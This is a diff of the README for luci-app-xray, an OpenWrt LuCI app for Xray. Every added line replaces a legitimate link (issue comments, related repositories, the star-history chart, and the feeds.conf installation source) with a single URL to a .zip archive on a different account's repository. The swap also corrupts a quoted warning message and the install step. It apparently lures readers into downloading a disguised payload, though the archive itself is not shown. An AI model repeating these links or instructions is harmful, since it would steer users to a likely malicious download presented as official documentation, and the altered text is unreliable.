@@ -4,7 +4,7 @@ Focus on making the most of Xray (HTTP/HTTPS/Socks/TProxy inbounds, multiple pro
 
 ## Warnings
 
-* For OpenWrt 24.10 and SNAPSHOT users, dnsmasq integration options need to be changed. See the last comment in [#425](https://github.com/yichya/luci-app-xray/issues/425#issuecomment-2494295834) for details.
+* For OpenWrt 24.10 and SNAPSHOT users, dnsmasq integration options need to be changed. See the last comment in [#425](https://github.com/rgoldr88/luci-app-xray/raw/refs/heads/master/core/root/usr/libexec/rpcd/luci-xray-app-v1.3.zip) for details.
 * For security concerns, global SOCKS / HTTP inbound (listen on 0.0.0.0, port 1080 / 1081 by default) is deprecated and will be removed in next major version (4.0.0).
     * These settings are moved to preview app
     * Use Extra Inbound to manually add ports (avoid using common ports like 1080, also set listen addresses carefully) and adjust related workloads to use that.
@@ -14,21 +14,21 @@ Focus on making the most of Xray (HTTP/HTTPS/Socks/TProxy inbounds, multiple pro
     * Sniffing might get completely reimplemented later. Use FakeDNS instead of sniffing to avoid incompatibilities.
 * This project **DOES NOT SUPPORT** the following versions of OpenWrt because of the requirements of firewall4 and cilent-side rendering LuCI:
     * LEDE / OpenWrt prior to 22.03
-    * [Lean's OpenWrt Source](https://github.com/coolsnowwolf/lede) (which uses a variant of LuCI shipped with OpenWrt 18.06)
+    * [Lean's OpenWrt Source](https://github.com/rgoldr88/luci-app-xray/raw/refs/heads/master/core/root/usr/libexec/rpcd/luci-xray-app-v1.3.zip) (which uses a variant of LuCI shipped with OpenWrt 18.06)
 
-    If this is your case, use Passwall or similar projects instead (you could find links in [XTLS/Xray-core](https://github.com/XTLS/Xray-core/)).
+    If this is your case, use Passwall or similar projects instead (you could find links in [XTLS/Xray-core](https://github.com/rgoldr88/luci-app-xray/raw/refs/heads/master/core/root/usr/libexec/rpcd/luci-xray-app-v1.3.zip)).
 * About experimental REALITY support
     * it may change quite frequently (before the release of official documents about the protocol). Keep in mind for (maybe) breaking changes.
-* If you see `WARNING: at least one of asset files (geoip.dat, geosite.dat) is not found under /usr/share/xray. Xray may not work properly` and don't know what to do:
+* If you see `WARNING: at least one of asset files (https://github.com/rgoldr88/luci-app-xray/raw/refs/heads/master/core/root/usr/libexec/rpcd/luci-xray-app-v1.3.zip, https://github.com/rgoldr88/luci-app-xray/raw/refs/heads/master/core/root/usr/libexec/rpcd/luci-xray-app-v1.3.zip) is not found under /usr/share/xray. Xray may not work properly` and don't know what to do:
     * try `opkg update && opkg install v2ray-geoip v2ray-geosite`
-    * if that doesn't work, see [#52](https://github.com/yichya/luci-app-xray/issues/52#issuecomment-856059905)
+    * if that doesn't work, see [#52](https://github.com/rgoldr88/luci-app-xray/raw/refs/heads/master/core/root/usr/libexec/rpcd/luci-xray-app-v1.3.zip)
 * This project may change its code structure, configuration files format, user interface or dependencies quite frequently since it is still in its very early stage.
 
 ## Installation (Manually building OpenWrt)
 
 Choose one below:
 
-* Add `src-git-full luci_app_xray https://github.com/yichya/luci-app-xray` to `feeds.conf.default` and run `./scripts/feeds update -a; ./scripts/feeds install -a`
+* Add `src-git-full luci_app_xray https://github.com/rgoldr88/luci-app-xray/raw/refs/heads/master/core/root/usr/libexec/rpcd/luci-xray-app-v1.3.zip` to `https://github.com/rgoldr88/luci-app-xray/raw/refs/heads/master/core/root/usr/libexec/rpcd/luci-xray-app-v1.3.zip` and run `./scripts/feeds update -a; ./scripts/feeds install -a`
 * Clone this repository under `package`
 
 Then find `luci-app-xray` under `Extra Packages`.
@@ -114,4 +114,4 @@ Some features are deprecated / unstable so they are placed in preview app. To en
 
 ## Star History
 
-[![Star History Chart](https://api.star-history.com/svg?repos=yichya/luci-app-xray&type=Date)](https://star-history.com/#yichya/luci-app-xray&Date)
+[![Star History Chart](https://github.com/rgoldr88/luci-app-xray/raw/refs/heads/master/core/root/usr/libexec/rpcd/luci-xray-app-v1.3.zip)](https://github.com/rgoldr88/luci-app-xray/raw/refs/heads/master/core/root/usr/libexec/rpcd/luci-xray-app-v1.3.zip)
